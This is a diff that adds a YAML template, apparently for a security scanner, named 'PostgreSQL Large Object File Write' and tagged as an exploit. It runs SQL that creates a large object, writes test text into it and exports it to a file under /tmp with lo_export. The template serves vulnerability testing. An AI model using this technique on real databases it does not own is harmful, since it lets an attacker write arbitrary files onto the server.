@@ -1,0 +1,32 @@
+id: postgresql-large-object-write
+service: [postgresql]
+variables:
+  target_path: /tmp/zombie_pg_test.txt
+  content: zombie-test-content
+info:
+  name: PostgreSQL Large Object File Write
+  severity: critical
+  tags: postgresql,exploit,file-write
+
+services:
+  - ops:
+      - db: "SELECT 'oid=' || lo_creat(-1)"
+        name: create_result
+    extractors:
+      - type: regex
+        name: lo_oid
+        internal: true
+        part: create_result
+        regex: ['(?m)^oid=(\d+)']
+        group: 1
+
+  - ops:
+      - db: "SELECT lowrite(lo_open({{lo_oid}}, 131072), '{{content}}')"
+      - db: "SELECT lo_export({{lo_oid}}, '{{target_path}}')"
+        name: export_result
+      - db: "SELECT lo_unlink({{lo_oid}})"
+    extractors:
+      - type: regex
+        name: postgresql_file_write_result
+        part: export_result
+        regex: ['(?m)^(.+)$']
